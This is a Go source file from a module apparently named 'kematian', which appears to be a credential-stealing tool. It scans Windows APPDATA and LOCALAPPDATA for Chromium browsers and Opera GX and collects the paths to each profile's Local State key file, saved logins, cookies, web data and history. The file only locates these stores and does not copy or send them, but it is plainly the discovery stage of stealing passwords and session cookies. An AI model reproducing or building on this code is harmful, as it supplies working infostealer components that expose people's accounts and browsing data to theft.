package finder

import (
	"kdot/kematian/browsers/chromium/structs"
	"os"
	"path/filepath"
	"strings"
)

type Finder struct {
	appData      string
	localAppData string
}

func (f *Finder) findBrowsers() []structs.Browser {
	found := make([]structs.Browser, 0)

	rootDirs := []string{f.appData, f.localAppData}

	profileNames := []string{"Default", "Profile"}

	for _, root := range rootDirs {
		directories, err := os.ReadDir(root)
		if err != nil {
			continue
		}

		for _, dir := range directories {
			dirPath := filepath.Join(root, dir.Name())

			filepath.WalkDir(dirPath, func(path string, d os.DirEntry, err error) error {
				//check is User Data folder exists
				opera := d.IsDir() && d.Name() == "Opera GX Stable"
				if (d.IsDir() && d.Name() == "User Data") || (opera) {
					//check if Local State file exists in this folder
					browserDB := structs.Browser{}
					localStatePath := filepath.Join(path, "Local State")
					if _, err := os.Stat(localStatePath); err == nil {
						//if local state exists then walk through the folder with 2 recurrsion and find webdata cookies history and logindata
						debth := 4
						currentPathSeperators := strings.Count(path, string(os.PathSeparator))
						profiles := []structs.Profiles{}

						filepath.WalkDir(path, func(path string, d os.DirEntry, err error) error {
							if d.IsDir() && strings.Count(path, string(os.PathSeparator))-currentPathSeperators > debth {
								return nil
							}
							//see if directory starts with anything from profileNames
							for _, profileName := range profileNames {
								profile := structs.Profiles{}
								if strings.HasPrefix(d.Name(), profileName) {
									profile.WebData = filepath.Join(path, "Web Data")
									profile.Cookies = filepath.Join(path, "Network", "Cookies")
									profile.History = filepath.Join(path, "History")
									profile.LoginData = filepath.Join(path, "Login Data")

									//fmt.Println(profile)

									profiles = append(profiles, profile)
									return nil
								}
							}
							return nil
						})

						if opera {
							profile := structs.Profiles{}

							profile.WebData = filepath.Join(path, "Web Data")
							profile.Cookies = filepath.Join(path, "Network", "Cookies")
							profile.History = filepath.Join(path, "History")
							profile.LoginData = filepath.Join(path, "Login Data")

							profiles = append(profiles, profile)
						}

						browserDB.Path = dirPath
						browserDB.LocalState = localStatePath
						browserDB.ProfilePath = strings.Split(path, string(os.PathSeparator))[strings.Count(path, string(os.PathSeparator))-1]
						browserDB.Chromeium = true
						browserDB.Profiles = profiles
						found = append(found, browserDB)
					}
				}
				return nil
			})
		}
	}
	return found
}

func FindBrowsers() []structs.Browser {
	f := &Finder{
		appData:      os.Getenv("APPDATA"),
		localAppData: os.Getenv("LOCALAPPDATA"),
	}

	foundBrowsers := f.findBrowsers()

	return foundBrowsers
}
